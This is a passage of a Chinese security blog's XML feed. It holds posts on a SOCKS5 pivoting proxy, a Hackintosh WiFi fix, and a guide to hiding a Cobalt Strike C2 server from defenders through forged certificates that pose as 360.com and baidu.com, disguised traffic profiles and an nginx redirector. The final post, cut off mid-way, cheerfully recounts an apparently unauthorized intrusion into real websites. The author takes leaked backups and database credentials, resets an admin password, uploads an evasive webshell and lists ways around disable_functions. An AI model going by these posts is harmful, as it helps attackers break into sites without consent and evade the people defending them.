class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">获取编译<br>git https://github.<span class="hljs-keyword">com</span>/ring04h/s5.<span class="hljs-keyword">go</span>.git<br><span class="hljs-keyword">cd</span> s5.<span class="hljs-keyword">go</span><br><span class="hljs-keyword">go</span> build .\s5.<span class="hljs-keyword">go</span> <br>./s5.<span class="hljs-keyword">go</span>.<span class="hljs-keyword">exe</span> //默认在<span class="hljs-number">8080</span>端口开启socket5服务<br></code></pre></td></tr></table></figure><img src="内网渗透之端口转发，socket代理/9.png" alt="9" style="zoom: 80%;" /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">Usage of C:\Users\28601.DESKTOP-7QBTS9F\Desktop\s5.go\s5.exe:<br>  -addr string<br>        proxy listen address (default &quot;:8080&quot;)<br>  -v    should every proxy request be logged to stdout<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">-addr 指定ip端口 <br>-v 开启程序打印日志<br>./s5.exe -addr <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">9696</span>  #在本地端口<span class="hljs-number">9696</span>开启socket5服务<br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/10.png" alt="10"></p><p>如果不想go程序显示</p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
      <tag>工具分享</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>完美黑苹果之WiFi热启动</title>
    <link href="/2021/05/09/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/"/>
    <url>/2021/05/09/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/sao.png" alt="1"></p><h3 id="小米pro黑苹果，WiFi补丁，支持WiFi热开关"><a href="#小米pro黑苹果，WiFi补丁，支持WiFi热开关" class="headerlink" title="小米pro黑苹果，WiFi补丁，支持WiFi热开关"></a>小米pro黑苹果，WiFi补丁，支持WiFi热开关</h3><p>黑苹果的安装，我在b站上有写过</p><p>首先下载两文件HeliPort和itlwm.kext</p><span id="more"></span><p>HeliPort</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/OpenIntelWireless/</span>HeliPort<br></code></pre></td></tr></table></figure><p>itlwm.kext</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/OpenIntelWireless/i</span>tlwm<br></code></pre></td></tr></table></figure><p>我已经打包好了，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">链接: https://pan.baidu.com/s/1BKZoNfsZRKsMQ3THxD3cKA 提取码: vxgz 复制这段内容后打开百度网盘手机App，操作更方便哦<br></code></pre></td></tr></table></figure><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/1.png" alt="1"></p><p>点击HeliPort.dmg，把HeliPort拖到应用程序中</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/2.png" alt="2"></p><p>再把HeliPort设置为开机启动</p><p>然后把itlwm-v1.2.0-DEBUG-alpha-c2f2c51.zip解压得到itlwm.kext</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/3.png" alt="3"></p><p>把itlwm.kext放到efi文件中的EFI\CLOVER\kexts\Other中</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/4.png" alt="4"></p><p>最后重启电脑进入Mac OS即可使用WiFi热启动，可以随意WiFi切换，WiFi启动关闭再也不用重启了！！！</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/5.png" alt="5"></p><p>点击开启WiFi即可正常开启WiFi</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/6.png" alt="6"></p><p>点击你要连接的WiFi，输入密码即可切换WiFi</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/7.png" alt="7"></p><p>连接成功</p><p><img src="/%E5%AE%8C%E7%BE%8E%E9%BB%91%E8%8B%B9%E6%9E%9C%E4%B9%8BWiFi%E7%83%AD%E5%90%AF%E5%8A%A8/8.png" alt="8"></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>黑苹果</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike特征隐藏</title>
    <link href="/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/"/>
    <url>/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h5 id=""><a href="#" class="headerlink" title=""></a><img src="/CobaltStrike%E6%95%99%E7%A8%8B/1.png" alt="扫码"></h5><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有很多同学私信我，说咋渗透？没有一个完整渗透流程？工具不会用？</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/1.jpg" alt="1"></p><p>今天他来了，这次给同学们带来，cs特征隐藏，</p><p>cs的基础用法，网上也有一大堆，先知社区也有很多大佬写得很详细了，我这里就不在讲了。</p><span id="more"></span><h2 id="CobaltStrike概述"><a href="#CobaltStrike概述" class="headerlink" title="CobaltStrike概述"></a>CobaltStrike概述</h2><p>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。<br>成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。<br>项目官网:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/2.png" alt="2"></p><p>俗称cs别名（多人运动），顾名思义，能够多人在线，搞事情</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/3.jpg" alt="3"></p><p>但是，cs这么强，cs的特征早被waf厂商标记了，你想想，好不容易搞下的目标，一连cs，就被waf提取到异常，分析下你的cs流量，ban了你的ip，cs权限就不又么得了，甚至被厉害的bt，溯源，万一你的密码简单，bt暴力破解你的cs，那不就被人一锅端了，</p><p><a href="https://github.com/shanfenglan/bruteforce_cs_pwd">cs暴力破解脚本</a></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/4.jpg" alt="4"></p><p>这时候，就要隐藏我们的cs了，给他加buff，让waf发现不了</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/5.jpg" alt="5"></p><h2 id="CobaltStrike特征隐藏的几种常见方法"><a href="#CobaltStrike特征隐藏的几种常见方法" class="headerlink" title="CobaltStrike特征隐藏的几种常见方法"></a>CobaltStrike特征隐藏的几种常见方法</h2><h3 id="1-修改默认端口"><a href="#1-修改默认端口" class="headerlink" title="1.修改默认端口"></a>1.修改默认端口</h3><p><strong>编辑文件teamserver进行启动项修改</strong></p><p>vim teamserver</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/6.png" alt="6"></p><p>修改为7896</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/7.png" alt="7"></p><p>然后启动</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/8.png" alt="8"></p><h3 id="2去除证书特征"><a href="#2去除证书特征" class="headerlink" title="2去除证书特征"></a>2去除证书特征</h3><p>Cobalt Strike默认的证书，已经被waf厂商标记烂了，我们要重新生成一个新的证书，这里我们用JDK自带的keytool证书工具来生成新证书。</p><p><strong>Linxu</strong></p><p>直接使用，keytool命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">keytool<br>密钥和证书管理工具<br><br>命令:<br><br> -certreq            生成证书请求<br> -changealias        更改条目的别名<br> -delete             删除条目<br> -exportcert         导出证书<br> -genkeypair         生成密钥对<br> -genseckey          生成密钥<br> -gencert            根据证书请求生成证书<br> -importcert         导入证书或证书链<br> -importpass         导入口令<br> -importkeystore     从其他密钥库导入一个或所有条目<br> -keypasswd          更改条目的密钥口令<br> -list               列出密钥库中的条目<br> -printcert          打印证书内容<br> -printcertreq       打印证书请求的内容<br> -printcrl           打印 CRL 文件的内容<br> -storepasswd        更改密钥库的存储口令<br><br>使用 &quot;keytool -command_name -help&quot; 获取 command_name 的用法<br></code></pre></td></tr></table></figure><p>在keystore里，包含两种数据：</p><p>密钥实体（Key entity）—— 密钥（secret key）又或者是私钥和配对公钥（采用非对称加密） 可信任的证书实体（trusted certificate entries）——只包含公钥</p><p><strong>修改CS的证书文件</strong></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/10.png" alt="10"></p><p>查看下cs的默认证书，口令为<code>123456</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">keytool -list -v -keystore cobaltstrike.store<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/11.png" alt="11"></p><p>可以看到，cs的默认证书的Alias name 、Onwer 和 Issuer 的信息，特征都比较明显。</p><p>该命令生成一个新的cs证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">360<br>keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;<br><br>baidu<br>keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN&quot;<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/14.png" alt="1"></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/12.png" alt="12"></p><p>把新生成的证书替换掉默认的证书‘</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/13.png" alt="13"></p><p><strong>Windows</strong></p><p>在JDK 1.4以后的版本中都包含了这一工具，它的位置为<code>&lt;JAVA_HOME&gt;\bin\keytool.exe</code>。</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/9.png" alt="9"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\28601.DESKTOP-7QBTS9F\Downloads\Compressed\kvm_client_windows\jre\bin\keytool.exe -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/15.png" alt="15"></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/16.png" alt="16"></p><h3 id="3-设置混淆配置文件"><a href="#3-设置混淆配置文件" class="headerlink" title="3.设置混淆配置文件"></a>3.设置混淆配置文件</h3><p>我们cs的客户端&#x2F;服务端的流量通信，大部分流量审计软件，都能检测到cs默认的通信流量，所以cs开发团队，设置了配置文件，让用户直接设置客户端&#x2F;服务端双向通信的流量格式以及软件相应配置,来绕过流量审计</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cs官网给出的配置文件编写指南<br>https:<span class="hljs-regexp">//</span>www.cobaltstrike.com/help-malleable-c2<br><br>官方也给出了一个可修改的配置文件<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rsmudge/</span>Malleable-C2-Profiles<br></code></pre></td></tr></table></figure><p>有兴趣的同学可自行看看配置如何写，我这边就直接github的了，地址如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal<br>https://github.com/threatexpress/malleable-c2<br></code></pre></td></tr></table></figure><p>这里使用伪造jQuery的C2-Profile</p><p>查看配置是否可用：.&#x2F;c2lint malleable-c2&#x2F;jquery-c2.4.2.profile</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/17.png" alt="17"></p><p>启动配置.&#x2F;teamserver 服务器ip cs密码 混淆配置文件</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/18.png" alt="18"></p><p>抓包看流量，确实改变了</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/19.png" alt="19"></p><h3 id="4-部署Nginx反向代理"><a href="#4-部署Nginx反向代理" class="headerlink" title="4.部署Nginx反向代理"></a>4.部署Nginx反向代理</h3><p>现在我们的cs服务器登录端口隐藏了，流量也做了混淆，着次就要把，cs监听端口，给隐藏起来了，要不然，默认geturl，就能获取到我们的shellcode，加密shellcode的密钥又是固定的(3.x 0x69，4.x 0x2e)，所以能从shellcode中解出c2域名等配置信息。</p><p>不修改特征的话nmap 一扫就出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap [ip][port] --script=grab_beacon_config.nse<br></code></pre></td></tr></table></figure><p>修改这个特征有两个方法，</p><p>1.修改源码加密的密钥，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">参考：Bypass cobaltstrike beacon config scan<br><br>https://cloud.tencent.com/developer/article/1764340<br></code></pre></td></tr></table></figure><p>2.限制端口访问，让一般的扫描器扫不了出开，</p><p>这里我们用nginx做反向代理，通过ua过滤流量，然后防火墙限制端口只能让127.0.0.1访问shellcode端口</p><p>先到我们的服务器上安装nginx服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">找到nginx安装路径<br>whereis nginx<br><br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/20.png" alt="20"></p><p>打开配置编辑nginx配置文件</p><p>一般在安装路径的<strong>config&#x2F;nginx.conf</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /usr/local/nginx/conf/nginx.conf //具体看个人的nginx安装位置<br>在http中的server中配置中添加<br>        location ~*jquery &#123;<br>            if ( $http_user_agent != &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;)<br>            &#123;<br>                return 404;<br>            &#125;<br>            proxy_pass http://127.0.0.1:2095;<br>        &#125;<br></code></pre></td></tr></table></figure><p>配置中的<strong>ua</strong>根据你的<strong>profile</strong>文件中设置的<strong>ua</strong>所定</p><p><strong>profile中的ua也可以自行修改</strong></p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/23.png" alt="23"></p><p>设置防火墙只能让127.0.0.1访问监听端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables -I INPUT -p TCP --dport 2095 -j DROP<br>iptables -I INPUT -s 127.0.0.1 -p TCP --dport 2095 -j ACCEPT<br>service iptables restart<br></code></pre></td></tr></table></figure><p>直接访问域名，直接跳转404</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/24.png" alt="24"></p><p>设置cs监听</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/25.png" alt="25"></p><p>直接生成exe，抓包测试，正常上线</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/21.png" alt="21"></p><h3 id="5-https上线"><a href="#5-https上线" class="headerlink" title="5.https上线"></a>5.https上线</h3><p>默认的HTTPS的Beacon上线机器用的证书，及其容易被查出来，被识别，这里我们可以用自己的证书</p><p>我们可以直接在cloudflare上申请，非常方便,选择默认的pem格式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cloudflare.com<span class="hljs-regexp">/zh-cn/</span>ssl/<br></code></pre></td></tr></table></figure><p>分别复制内容保存为key.pem和chain.pem上传到cs的服务器上，再在nginx配置文件中启用证书。</p><p><img src="/CobaltStrike%E6%95%99%E7%A8%8B/26.png" alt="25"></p><p>为cobalt strike 配置证书<br>1.生成xxx.com.store文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">openssl pkcs12 -export -<span class="hljs-keyword">in</span> /api<span class="hljs-selector-class">.xxx</span>.com/sss<span class="hljs-selector-class">.pem</span> -inkey /api<span class="hljs-selector-class">.xxx</span>.com/ssk<span class="hljs-selector-class">.pem</span> -out api<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.p12</span> -name api<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.com</span> -passout pass:<span class="hljs-number">123456</span><br>keytool -importkeystore -deststorepass <span class="hljs-number">123456</span> -destkeypass <span class="hljs-number">123456</span> -destkeystore api<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.com</span> -<span class="hljs-attribute">src</span><br></code></pre></td></tr></table></figure><p>2.将生成的api.xxx.com.store放到cs目录下，修改teamserver文件最后一行,将cobaltstrike.store修改为api.xxx.com.store和store文件对应的密码。（有必要的话，把端口号也可以改了并设置iptables只允许特定ip访问）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">java -XX:<span class="hljs-attribute">ParallelGCThreads</span>=4 -Dcobaltstrike.<span class="hljs-attribute">server_port</span>=40120 -Djavax.net.ssl.<span class="hljs-attribute">keyStore</span>=./api.xx<br></code></pre></td></tr></table></figure><p>3.将 keystore 加入 Malleable C2 profile 中</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">https-certificate &#123;<br>     <span class="hljs-keyword">set</span> keystore “<span class="hljs-comment">api.xxx.com.store</span>”;<br>     <span class="hljs-keyword">set</span> password “<span class="hljs-comment">123456</span>”;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后启动cs设置listener。</p><p>再通过nohup .&#x2F;teamserver IP password amazon.profile &amp;启动后抓上线包，证书就是自己申请的了</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>​我的博客开通了，还望大佬多多指点</p><p>​<a href="https://kosakd.top/">kosakd.top</a></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
      <tag>CobaltStrike教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次无意的渗透测试</title>
    <link href="/2021/05/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%84%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2021/05/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%84%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%84%8F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="扫码"></p><p>由于最近再写一个web漏洞扫描器，准备在fofa上找网站测试的时候，无意间看到了个标题，xx系统，</p><span id="more"></span><p> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326143905-f59774c6-8dfd-1.png"><br>点进去一看，好家伙，这不就是我很收悉的，那个xxcms嘛（具体的忘记了）<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326143922-ffe730c4-8dfd-1.jpg"></p><p>正好通过这个网站的cms漏洞，测试下我的扫描器，结果，好家伙，这一扫，cms漏洞没扫出来源码倒是给我扫出来了，发现备份文件了<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326143938-09c09572-8dfe-1.png"></p><p>这网站的备份文件，居然放在主目录下，以域名加.tar.gz结尾</p><p>好家伙，这一拿到源码一看，审计下，发现看不来，看不了，这是一个二次开发的框架，把基本上公开的漏洞都给补了，不过数据库账号密码拿到了，不过限制了外链<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326143949-101d37ea-8dfe-1.png"><br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326143957-14e3f9b2-8dfe-1.png"></p><p>代码审计这块看来是没希望了，哎，人又菜，又爱渗透，那咋办呢?<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144019-22241f9e-8dfe-1.png"><br>答案，当然是找大佬了，<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144032-296ef15c-8dfe-1.jpg"></p><p>Emmm，好像我没有大佬带我&#x2F;(ㄒoㄒ)&#x2F;~~<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144042-2f756202-8dfe-1.jpg"></p><p>既然，没人疼，没人爱，那就搞旁站<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144051-35009b38-8dfe-1.jpg"></p><p>登录，fofa找下旁站，这查不知道到啊一查吓一跳啊，好多站点啊，都再一个服务器，域名真多</p><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144108-3eec7964-8dfe-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144131-4ccc01da-8dfe-1.png"></p><p>这个应该是官网了，官网是个，月子会所的主页，进入会所，看样子好像是深圳那边比较有名的月子会所吧，我也不清楚</p><p>啥也不管先看看，这个网站怎么样？扫描器一起一波，发现是dedecms5.7<br>后台扫不出来<br>Emmm，这尼玛就烦了呀，然后再找下看有没有备份文件<br>一看，没有，通过上面的规律找备份文件，发现没得，<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144206-61f04a26-8dfe-1.jpg"><br>我想是不是哪里有问题，突然灵光一闪，dedecms好像有个爆绝对路径的漏洞呀，搞起，<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144517-d392bff6-8dfe-1.png"></p><p>原来，这个站点改了域名，通过原来的文件名加后缀，获取备份文件<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144551-e787eca2-8dfe-1.png"><br>好家伙，这一看源代码，引入眼帘的一个文件夹名字，好吸引人啊，<br>@)!^hssjORG$$$<br>这一串字符恐怖如斯啊┌(。Д。)┐<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144605-f013a2b2-8dfe-1.png"><br>怪不得我爆破不到站点后台，这尼玛，这谁爆破的出来啊，特殊字符和大小写字母，我只能说一个字，牛，看来这个服务器应该是找人运维过，维护过吧<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144623-fb011a42-8dfe-1.jpg"></p><p>这次源码没啥好审计的，我没有0day</p><p>这次里面还有sql的备份，找到了admin账号密码，去头去尾，md5解密，没戏<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144641-05e327b6-8dff-1.png"><br>哦豁，完蛋，又没得了，下一个</p><p>下一个网站也上一样的，dedecms5.7</p><p>不过，希望来了，这个站点有phpadmin<br>这就有戏了呀<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144708-15bd73c6-8dff-1.png"></p><p>phpadmin，数据库账号密码，绝对路径<br>这不妥妥的getshell，三件条准备好啦，这不拿下？<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144727-20c0444c-8dff-1.jpg"><br>结果，自然没话说，这通过mysql日志getshell，不成功，可能是宝塔给拦下来了，日志显示不正常，，不知道为什么？<br>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144747-2d0e34ca-8dff-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144804-3729a6b0-8dff-1.png"><br>好的吧，是我太天真了<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144820-4064d13c-8dff-1.jpg"><br>等等，我好像忘记了啥。。。后台呀！还是那句话，只要思想不滑坡，办法总比困难多！</p><p>既然密码解不出来，那就改密码，都有数据root权限了，还怕啥，直接干，就完了！</p><p> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144838-4b0b205a-8dff-1.jpg"><br>直接上后台，<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144852-53cc1df2-8dff-1.png"><br>系统这么就没更新了，点击文件管理，试试看能不能上次文件<br>   <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144917-624d9b30-8dff-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144933-6c3bee3a-8dff-1.png"><br>啊，我大意了啊，没有闪，太快了，我截图都没截上就上传好了</p><p> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326144957-7a6b6274-8dff-1.jpg"></p><p>渗透到这里我以为，就这，就这，这尼玛，这一下就没了？这也太简单了吧？<br>这该死的臭运气选手啊。(●ˇ∀ˇ●)<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145008-80ffade8-8dff-1.jpg"></p><p>果然，我高兴的太早了，当我上传给冰蝎免杀马上去，结果，返回正常，但是不能执行命令，文件也获取不到，这。。。。问题又来了啊<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145023-89ca8ede-8dff-1.png"></p><p>这八成是disable_functions把函数全给禁了<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145034-90b01390-8dff-1.png"><br>好吧，既然禁止，那就绕吧<br>到网上看了下，找到大概绕过disable_functions这几种办法，还有大佬有别的想法的可以留言哈，多多交流<br>•常规绕过：exec,shell_exec,system,passthru,popen,proc_open<br>•利用环境变量LD_PRELOAD绕过mail,imap_mail,error_log,mb_send_mail<br>•利用pcntl_exec绕过利用imap_open函数任意命令执行(CVE-2018-19518)<br>•利用系统组件window com绕过利用Apache+mod_cgi+.htaccess<br>•绕过利用ImageMagick漏洞绕过利用PHP7.4的FFI绕过利用 ShellShock绕过(CVE-2014-6271)<br>•蚁剑插件</p><p>我应为懒，就直接上蚁剑插件了，这边还个小插曲，因为这个站是php5，绕不过，只能提权另一个php7的旁站，才绕过disable_functions执行命令<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210326145049-99623b3a-8dff-1.png"></p><p> <img 